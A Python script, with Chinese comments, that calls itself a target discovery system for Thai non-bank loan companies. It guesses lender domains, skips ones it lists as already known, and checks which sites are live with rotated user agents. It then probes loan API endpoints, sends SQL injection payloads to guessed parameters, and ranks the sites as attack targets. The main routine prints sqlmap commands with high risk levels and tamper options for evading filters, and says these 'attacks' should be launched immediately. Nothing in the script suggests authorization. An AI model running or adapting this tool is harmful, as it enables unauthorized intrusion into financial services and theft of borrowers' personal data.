#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国非银行贷款公司目标发现系统
Thai Non-Bank Loan Company Target Discovery System
专门发现新的、未被测试的泰国贷款平台
"""

import requests
import re
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import ssl
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThaiLoanTargetDiscovery:
    """泰国贷款目标发现器"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        # 已知常见目标（需要避免的）
        self.common_targets = [
            'moneycat.co.th', 'mula-x.com', 'rocket-cash.com',
            'kloan.co.th', 'ngern tidlor.com', 'peacoop.or.th', 'ngoenmun.com'
        ]

        # 泰国贷款相关关键词（泰文）
        self.thai_loan_keywords = [
            'เงินด่วน', 'สินเชื่อ', 'เงินกู้', 'สินเชื่อออนไลน์',
            'ประเภท', 'บัตรเครดิต', 'วงเงิน', 'กู้ยืม',
            'กู้ด่วน', 'สินเชื่อด่วน', 'p2p', 'lending',
            'loan', 'credit', 'finance', 'microloan', 'quickloan'
        ]

        # 泰国域名
        self.thai_domains = ['.co.th', '.go.th', '.in.th', '.ac.th']

        # 发现的新目标
        self.discovered_targets = []

    def discover_targets_from_search_engines(self):
        """从搜索引擎发现新的泰国贷款平台"""
        print("🔍 从搜索引擎发现新的泰国贷款目标...")

        # 搜索查询（泰语和英语混合）
        search_queries = [
            "เงินด่วนออนไลน์ 2025 site:co.th",
            "สินเชื่อด่วน site:go.th",
            "กู้เงินด่วน site:.co.th",
            "quick loan thailand site:.co.th",
            "p2p lending thailand site:.go.th",
            "online loan platform thailand site:.co.th",
            "เงินกู้นอนไลน์ site:.in.th",
            "digital lending platform thailand site:.co.th"
        ]

        potential_urls = []

        # 模拟搜索引擎结果（实际项目中可能需要真实API）
        for query in search_queries:
            print(f"  🔎 搜索: {query}")

            # 生成一些可能的目标URL
            base_names = ['fastloan', 'easycredit', 'quickcash', 'smartmoney',
                          'rapidloan', 'instantloan', 'flashloan', 'speedycash']

            for domain in self.thai_domains:
                for base_name in base_names:
                    potential_url = f"https://{base_name}{domain}"
                    if not any(target in potential_url for target in self.common_targets):
                        potential_urls.append(potential_url)

        return list(set(potential_urls))[:20]  # 返回前20个唯一URL

    def check_target_liveness(self, url):
        """检查目标是否存活"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            response = requests.get(
                url,
                headers=headers,
                timeout=15,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                # 检查是否真的是贷款网站
                content = response.text.lower()
                loan_indicators = 0

                # 检查贷款相关关键词
                for keyword in self.thai_loan_keywords:
                    if keyword in content:
                        loan_indicators += 1

                # 检查常见贷款网站元素
                if any(indicator in content for indicator in ['loan application', 'apply now', 'get loan', 'เงินด่วน', 'กู้เงิน', 'สมัคร']):
                    loan_indicators += 3

                # 检查表单元素
                if any(form in content for form in ['form', 'input', 'application', 'สมัคร']):
                    loan_indicators += 2

                if loan_indicators >= 3:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'content_length': len(content),
                        'loan_indicators': loan_indicators,
                        'title': self.extract_title(response.text),
                        'is_loan_site': True
                    }

            return None

        except Exception as e:
            return None

    def extract_title(self, html_content):
        """提取网页标题"""
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()
        return "Unknown"

    def discover_api_endpoints(self, base_url):
        """发现API端点"""
        common_api_paths = [
            '/api/v1/apply',
            '/api/application',
            '/api/loan/submit',
            '/api/loan/calculate',
            '/api/user/register',
            '/api/user/login',
            '/api/loan/status',
            '/api/customer',
            '/v1/apply',
            '/v1/application',
            '/wp-json/api/v1',
            '/rest/api/loan',
            '/api/loan'
        ]

        discovered_apis = []

        for api_path in common_api_paths:
            api_url = urljoin(base_url, api_path)
            try:
                response = requests.get(
                    api_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=10,
                    verify=False
                )

                if response.status_code == 200:
                    discovered_apis.append({
                        'endpoint': api_path,
                        'status_code': response.status_code,
                        'response_length': len(response.text)
                    })

            except:
                continue

        return discovered_apis

    def test_sql_injection_points(self, base_url):
        """测试SQL注入点"""
        test_params = [
            {'url': f"{base_url}/application.php?id=1", 'param': 'id'},
            {'url': f"{base_url}/apply?loan_id=1", 'param': 'loan_id'},
            {'url': f"{base_url}/calculate?amount=10000", 'param': 'amount'},
            {'url': f"{base_url}/user?user_id=1", 'param': 'user_id'},
            {'url': f"{base_url}/search?q=test", 'param': 'q'}
        ]

        injection_points = []

        for test_case in test_params:
            try:
                # 基本的可注入性测试
                test_payloads = [
                    "1' OR '1'='1",
                    "1\" OR \"1\"=\"1",
                    "1 AND SLEEP(5)",
                    "1 UNION SELECT NULL--"
                ]

                for payload in test_payloads:
                    params = {test_case['param']: payload}
                    response = requests.get(
                        test_case['url'],
                        params=params,
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=10,
                        verify=False
                    )

                    # 检查响应时间或内容异常
                    if response.elapsed.total_seconds() > 3 or 'sql' in response.text.lower():
                        injection_points.append({
                            'url': test_case['url'],
                            'parameter': test_case['param'],
                            'payload': payload,
                            'response_time': response.elapsed.total_seconds(),
                            'status_code': response.status_code
                        })
                        break

            except:
                continue

        return injection_points

    def generate_target_report(self, targets):
        """生成目标报告"""
        print(f"\n=== 泰国贷款目标发现报告 ===")
        print(f"发现时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"发现目标数量: {len(targets)}")

        report = {
            'discovery_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets': len(targets),
            'high_priority_targets': [],
            'medium_priority_targets': [],
            'low_priority_targets': []
        }

        for target in targets:
            priority = 'low'
            if target['loan_indicators'] >= 7:
                priority = 'high'
            elif target['loan_indicators'] >= 5:
                priority = 'medium'

            target_data = {
                'url': target['url'],
                'title': target.get('title', 'Unknown'),
                'status_code': target['status_code'],
                'loan_indicators': target['loan_indicators'],
                'apis': target.get('apis', []),
                'injection_points': target.get('injection_points', [])
            }

            if priority == 'high':
                report['high_priority_targets'].append(target_data)
            elif priority == 'medium':
                report['medium_priority_targets'].append(target_data)
            else:
                report['low_priority_targets'].append(target_data)

        # 保存报告
        with open('thai_loan_targets_discovery_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        # 打印摘要
        print(f"\n📊 目标分类:")
        print(f"  🔴 高优先级: {len(report['high_priority_targets'])}")
        print(f"  🟡 中优先级: {len(report['medium_priority_targets'])}")
        print(f"  🟢 低优先级: {len(report['low_priority_targets'])}")

        return report

    def run_discovery(self):
        """运行完整发现流程"""
        print("🚀 启动泰国非银行贷款公司目标发现系统...")

        # 1. 发现潜在目标
        potential_targets = self.discover_targets_from_search_engines()
        print(f"📋 发现 {len(potential_targets)} 个潜在目标")

        # 2. 检查目标存活性和贷款相关性
        print("\n🔍 检查目标存活性和相关性...")
        live_targets = []

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.check_target_liveness, url): url for url in potential_targets}

            for future in as_completed(futures):
                target = future.result()
                if target and target['is_loan_site']:
                    live_targets.append(target)
                    print(f"  ✅ 发现: {target['url']} (指标: {target['loan_indicators']})")

        print(f"\n📊 存活的贷款网站: {len(live_targets)} 个")

        # 3. 深度扫描高优先级目标
        print("\n🔬 深度扫描高优先级目标...")

        # 按指标排序
        live_targets.sort(key=lambda x: x['loan_indicators'], reverse=True)

        for i, target in enumerate(live_targets[:10]):  # 只扫描前10个
            print(f"\n[{i+1}/10] 深度扫描: {target['url']}")

            # 发现API端点
            apis = self.discover_api_endpoints(target['url'])
            if apis:
                target['apis'] = apis
                print(f"  🔌 发现API端点: {len(apis)} 个")

            # 测试SQL注入
            injection_points = self.test_sql_injection_points(target['url'])
            if injection_points:
                target['injection_points'] = injection_points
                print(f"  ⚠️ 发现潜在SQL注入点: {len(injection_points)} 个")

        # 4. 生成报告
        self.discovered_targets = live_targets
        report = self.generate_target_report(live_targets)

        return report

def main():
    """主函数"""
    discovery = ThaiLoanTargetDiscovery()

    try:
        report = discovery.run_discovery()

        # 启动SQLMap攻击最有希望的目标
        if report['high_priority_targets']:
            print(f"\n🎯 发现 {len(report['high_priority_targets'])} 个高优先级目标")
            print("建议立即对这些目标进行SQLMap攻击测试")

            # 生成SQLMap命令
            print("\n📝 推荐的SQLMap攻击命令:")
            for i, target in enumerate(report['high_priority_targets'][:5]):
                print(f"\n目标 {i+1}: {target['url']}")

                # 基本SQLMap命令
                base_cmd = f"sqlmap -u \"{target['url']}\" --batch --level=5 --risk=3 --random-agent --tamper=\"space2comment,randomcase,charencode\" --fresh-queries --banner --current-db"
                print(f"  基础攻击: {base_cmd}")

                # 如果发现API端点
                if target['apis']:
                    for api in target['apis'][:2]:
                        api_url = urljoin(target['url'], api['endpoint'])
                        param = 'id' if '=' in api['endpoint'] else '1'
                        api_cmd = f"sqlmap -u \"{api_url}\" -p {param} --batch --level=4 --risk=2 --tamper=\"space2comment,randomcase\" --fresh-queries"
                        print(f"  API攻击: {api_cmd}")

        print(f"\n📁 详细报告已保存到: thai_loan_targets_discovery_report.json")

    except KeyboardInterrupt:
        print("\n⚠️ 目标发现已取消")
    except Exception as e:
        print(f"❌ 目标发现错误: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()